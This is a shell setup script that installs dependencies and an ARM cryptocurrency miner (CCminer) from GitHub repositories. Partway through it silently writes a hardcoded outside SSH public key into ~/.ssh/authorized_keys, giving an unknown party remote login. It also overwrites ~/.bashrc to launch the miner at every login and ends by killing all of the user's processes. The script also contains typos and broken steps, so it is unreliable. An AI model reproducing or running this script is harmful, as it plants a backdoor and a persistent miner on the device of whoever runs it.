
#!/bin/sh
rm -rf jk8180
rm -rf ccminer
rm -rf CCminer-ARM-optimized
yes | sudo apt update && sudo apt upgrade
yes | sudu apt install libjansson build-essential clang binutils git dialog
yes | sudo apt install python3
yes | sudo apt install libjansson wget nano
yes | sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev figlet 
wget http://ports.ubuntu.com/pool/main/o/openssl/libssl1.1_1.1.0g-2ubuntu4_arm64.deb
sudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
if [ ! -d ~/.ssh ]
then
  mkdir ~/.ssh
  chmod 0700 ~/.ssh
  cat << EOF > ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V>
EOF
  chmod 0600 ~/.ssh/authorized_keys
fi

# Clone repository 

git clone https://github.com/chiharu92msn/jk8180-userland.git
cd jk8180-userland

git clone https://github.com/chiharu92msn/set-miner-off.git
chmod +x start.sh net.sh net1.sh net2.sh net.sh


mkdir miner && cd miner

GITHUB_RELEASE_JSON=$(curl --silent "https://api.github.com/repos/Oink70/CCminer-ARM-optimized/releases?per_page=1" | jq -c '[.[] | del (.body)]')
GITHUB_DOWNLOAD_URL=$(echo $GITHUB_RELEASE_JSON | jq -r ".[0].assets[0].browser_download_url")
GITHUB_DOWNLOAD_NAME=$(echo $GITHUB_RELEASE_JSON | jq -r ".[0].assets[0].name")

echo "Downloading latest release: $GITHUB_DOWNLOAD_NAME"
echo 'cd jk8180 && ./start.sh' > ~/.bashrc
echo '{
    "name": "A5s0038",
    "cpu": 8
}' > ~/jk8180/set-miner-off/offline.json
killall -9 -u $(id -un)
